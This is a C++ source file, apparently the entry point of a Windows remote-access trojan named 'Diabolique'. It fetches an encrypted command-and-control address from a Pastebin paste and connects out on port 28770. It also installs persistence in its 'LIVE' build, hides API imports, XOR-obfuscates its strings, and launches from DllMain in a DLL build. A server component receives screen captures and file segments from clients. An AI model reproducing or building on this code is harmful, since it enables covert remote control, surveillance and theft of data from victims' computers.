// Diabolique2.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "Diabolique2.h"
#include "IDiaboliqueIO.h"
#include <ProcessController/CDiabolqiueProcess.h>
#include <IDiabolique.h>
#include <CWinSocksDataTransfer.h>
#include <CDiaboliqueServer.h>
#include "CPersistence.h"

//#pragma comment(lib, "Shcore.lib")

#include <iostream>

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:

ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
std::string ConvertFriendTypeNameToPath(std::string friendly)
{
    int nStringStart = friendly.find("\"") + 1;
    int nStringEnd = friendly.find("\"", nStringStart + 1);

    friendly = friendly.substr(nStringStart, nStringEnd - nStringStart);
    // resolve env variables
    int nEnvStart = 0;
    int nEnvEnd = 0;
    while (true)
    {
        nEnvStart = friendly.find("\%", nEnvStart) + 1;

        if (nEnvStart == -1 || nEnvStart == 0)
            break;

        nEnvEnd = friendly.find("\%", nEnvStart);

        std::string env_variable = friendly.substr(nEnvStart, nEnvEnd - nEnvStart);

        char* env_result = getenv(env_variable.c_str());

        if (!env_result)
            return friendly;

        friendly.erase(friendly.begin() + nEnvStart - 1, friendly.begin() + nEnvEnd + 1);
        friendly.insert(nEnvStart - 1, std::string(env_result));

        int l = 0;
        nEnvStart = nEnvEnd;
    }
    return friendly;
}


std::string GetPowerShellPath()
{
    static WINDOWS_IMPORT_HIDE(RegOpenKeyA, "Advapi32.dll");
    static WINDOWS_IMPORT_HIDE(RegQueryValueExA, "Advapi32.dll");

    HKEY keyres;
    _RegOpenKeyA(HKEY_CLASSES_ROOT,
        XorStr("Microsoft.PowerShellConsole.1"),
        &keyres);

    char key_buffer[4096];
    size_t bufsize = sizeof(key_buffer);
    _RegQueryValueExA(keyres,
        XorStr("FriendlyTypeName"),
        NULL, NULL, (BYTE*)key_buffer, (LPDWORD)&bufsize);

    return ConvertFriendTypeNameToPath(key_buffer);
}

#if (defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)) && !defined(SERVER_DLL)


#include "IDiaboliqueServerInterface.h"

class CInterface : public IDiaboliqueServerInterface
{
public:

protected:
    virtual void _INTRNL_AcceptClientsThread()
    {
        PopulateCommands();
        while (true)
        {

            CWinSocksDataTransfer* DataTransferServer = new CWinSocksDataTransfer();
            CWinSocksDataTransfer::_initialize_data data_server;
            strcpy(data_server.m_Port, "28770");
            data_server.m_bServer = true;
            data_server.m_nSocketOverride = INVALID_SOCKET;

            DataTransferServer->Initialize(&data_server,
                sizeof(CWinSocksDataTransfer::_initialize_data));

            CDiaboliqueServerClient* client = new CDiaboliqueServerClient();
            client->SetDataTranfer(DataTransferServer);
            client->AddMessageHandler(diabolique_message_type_t::k_dmCTSModuleCreationNotify, &CDiaboliqueServer::ModuleCreationResultHandler);
            client->AddMessageHandler(diabolique_message_type_t::k_dmATAModuleData, &CDiaboliqueServer::ModuleMessageHandler);
            client->AddMessageHandler(diabolique_message_type_t::k_dmCTSScreenCap, &CDiaboliqueServer::ScreenCapImageData);
            client->AddMessageHandler(diabolique_message_type_t::k_dmCTSFileSegment, &CDiaboliqueServer::FileSegmentHandle);
            int nID = AddClient(client);
            printf("Added Client : %d\n", nID);

        }
    }
};
#endif // #if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)

HANDLE g_Mutex = INVALID_HANDLE_VALUE;
bool GrabMutex()
{
#ifndef _DEBUG
    WINDOWS_IMPORT_HIDE(CreateMutexA, "kernel32.dll");

    WINDOWS_IMPORT_HIDE(GetLastError, "kernel32.dll");
    const char* szUniqueNamedMutex = XorStr("com_diabolique");
    g_Mutex = _CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
    if (ERROR_ALREADY_EXISTS == _GetLastError())
    {
        return false; // Exit program
    }

#endif
    return true;
}

void UnGrabMutex()
{
#ifndef _DEBUG
    WINDOWS_IMPORT_HIDE(ReleaseMutex, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(CloseHandle, "kernel32.dll");

    _ReleaseMutex(g_Mutex); // Explicitly release mutex
    _CloseHandle(g_Mutex); // close handle before terminating
#endif
}
#include "CCurrentEnviroment.h"
#include <PETools.h>


#if 0
void compress_restarter()
{
    std::ifstream in("DiaboliqueAutoRestart.exe", std::ios::in | std::ios::binary);

    in.seekg(0, std::ios::end);
    size_t nSize = in.tellg();
    in.seekg(0, std::ios::beg);

    unsigned char* pPtr = (unsigned char*)malloc(nSize);
    unsigned char* pPtrOut = (unsigned char*)malloc((nSize + sizeof(int)) * 1.5);

    *(int*)pPtrOut = nSize;
    in.read((char*)pPtr, nSize);
    mz_ulong out_size = nSize;
    mz_compress2(pPtrOut + sizeof(int), &out_size, pPtr, nSize, MZ_UBER_COMPRESSION);
    
    

    printf("Compressed %d bytes -> %d Bytes!\n", nSize, out_size + sizeof(int));

    std::ofstream out("compressed_restarter.exe", std::ios::out | std::ios::binary);
    out.write((const char*)pPtrOut, out_size + sizeof(int));
    out.close();
}
void decompress_restarter()
{
    std::ifstream in("compressed_restarter.exe", std::ios::in | std::ios::binary);

    in.seekg(0, std::ios::end);
    size_t nSize = in.tellg();
    in.seekg(0, std::ios::beg);


    unsigned char* pPtr = (unsigned char*)malloc(nSize);

    in.read((char*)pPtr, nSize);

    int dwSize = *(int*)pPtr;

    unsigned char* pPtrOut = (unsigned char*)malloc(dwSize * 1.5);

    mz_ulong nSizeOut = dwSize;
    
    int ret = mz_uncompress(pPtrOut, &nSizeOut, pPtr + sizeof(int), nSize - sizeof(int));

    if (ret != MZ_OK)
        __debugbreak();

    printf("Decompressed %d bytes -> %d Bytes!\n", nSize, nSizeOut);

    std::ofstream out("uncompressed_restarter.exe", std::ios::out | std::ios::binary);
    out.write((const char*)pPtrOut, dwSize);
    out.flush();
    out.close();
}
#endif
std::string hexStr(BYTE* data, int len)
{
    std::stringstream ss;
    ss << std::hex;

    for (int i(0); i < len; ++i)
    {
        ss << std::setw(2) << std::setfill('0') << (int)data[i];
        ss << " ";
    }

    return ss.str();
}
int char2int(char input)
{
    if (input >= '0' && input <= '9')
        return input - '0';
    if (input >= 'A' && input <= 'F')
        return input - 'A' + 10;
    if (input >= 'a' && input <= 'f')
        return input - 'a' + 10;
    return 0;
}
// This function assumes src to be a zero terminated sanitized string with
// an even number of [0-9a-f] characters, and target to be sufficiently large
void hex2bin(const char* src, char* target)
{
    while (*src && src[1])
    {
        *(target++) = char2int(*src) * 16 + char2int(src[1]);
        src += 3;
    }
}

#include <aes_utils.h>
IDataTransfer* __stdcall CreateNewDiaboliqueIntance(IDataTransfer* pOld)
{
    WINDOWS_IMPORT_HIDE(Sleep, "Kernel32");

    static std::string ip_addr;

    if (ip_addr.empty())
    {
        while (!get_paste_bin_text(XorStr("HHZCqzWt"), ip_addr)) { _Sleep(10000); }
    }
    CWinSocksDataTransfer* DataTransferClient = new CWinSocksDataTransfer();
    CWinSocksDataTransfer::_initialize_data data_client;

    char enc_databuffer[MAX_PATH];
    memset(enc_databuffer, 0, sizeof(enc_databuffer));
    hex2bin(ip_addr.data(), enc_databuffer);

#ifdef _DEBUG
    printf("DataBuffer : %s\n", hexStr((BYTE*)enc_databuffer, ip_addr.size()).c_str());
#endif



    
    size_t nDataOutSize = 0;
    const char* szIPAddr = (const char*)aes_decrypt_buffer((unsigned char*)enc_databuffer,
        0, 
        (unsigned char*)szDecKey,
        nDataOutSize,
        AESKeyLength::AES_256
    );
    
    // XorStr("108.31.151.11")
    
    strcpy(data_client.m_IPAddress, XorStr("127.0.0.1")); /* szIPAddr XorStr("127.0.0.1")*/
    strcpy(data_client.m_Port, XorStr("28770"));
    data_client.m_bServer = false;
    data_client.m_nSocketOverride = INVALID_SOCKET;
    while (!DataTransferClient->Initialize(&data_client,
        sizeof(CWinSocksDataTransfer::_initialize_data)))
    {
#ifdef _DEBUG
        printf("Unable To Connect To Server!\n");
#endif
        _Sleep(10000);
    }

    free((void*)szIPAddr);
    return DataTransferClient;
}



int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

#if !defined(SERVER) || defined(SERVER_CLIENT)
    //if (!GrabMutex())
    //    return 0;

    PETools::INIT_PETools_NoPass();

    g_pEnv = new CCurrentEnviroment();
    g_pEnv->GetEnv();



#if defined(LIVE)

    CPersistence cPerc;
    if (cPerc.Initialize())
    {
        UnGrabMutex();
        return 0;
    }


#else
#pragma message("COMPILED RELEASE BUT WITHOUT LIVE SET, BE CAREFUL THIS IS WHAT YOU WANT!")
#endif
#endif

    srand(time(NULL));

    g_pThreadPool = new CSimpleThreadPool<8>();
    WINDOWS_IMPORT_HIDE(Sleep, "Kernel32");


#if (defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)) && !defined(SERVER_DLL)

    WINDOWS_IMPORT_HIDE(SetProcessDpiAwareness, "Shcore.dll");
    _SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);

    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONOUT$", "w", stdout);



    printf("======= STARTING DIABOLIQUE SERVER =======\n");
    const char* szIP = "127.0.0.1\0";
    size_t nLenOfIP = strlen(szIP);
    const char* encIP = (const char*)aes_encrypt_buffer((unsigned char*)szIP, nLenOfIP, (unsigned char*)szDecKey, AESKeyLength::AES_256);


    std::string encIPStr = hexStr((BYTE*)encIP, nLenOfIP);
    printf("Encrypted IP Addr : %s\n", encIPStr.c_str());
    free((void*)encIP);

    CInterface Server;

#ifndef _DEBUG
    while (true)
    {
        Sleep(99999);
    }
#endif

#endif


#if !defined(SERVER) || defined(SERVER_CLIENT)
    IDiabolique Dia;
    Dia.Startup(true);
    Dia.SetAutoRestarter(CreateNewDiaboliqueIntance);
    Dia.SetDataTranfer(CreateNewDiaboliqueIntance(nullptr));
    while (true) {
         _Sleep(20000000);  

         if (Dia.ShouldExitProcess()) // we should call exit instead of this shit. 
             break;
    }
#endif
#if !defined(SERVER) || defined(SERVER_CLIENT)
    UnGrabMutex();
#endif
    return 0;
}
#if defined(SERVER_DLL)
#include "CDllServerInterface.h"
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        AllocConsole();
        FILE* fDummy;
        freopen_s(&fDummy, "CONIN$", "r", stdin);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        g_pDLLInterface = new CDllServerInterface();
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
#elif defined(RELEASE_DLL)
#include <thread>

void call_main(HINSTANCE hinstDLL)
{
    wWinMain(hinstDLL, 0,0,0);
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load
    {
        static std::thread t(call_main, hinstDLL);
    }
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

#endif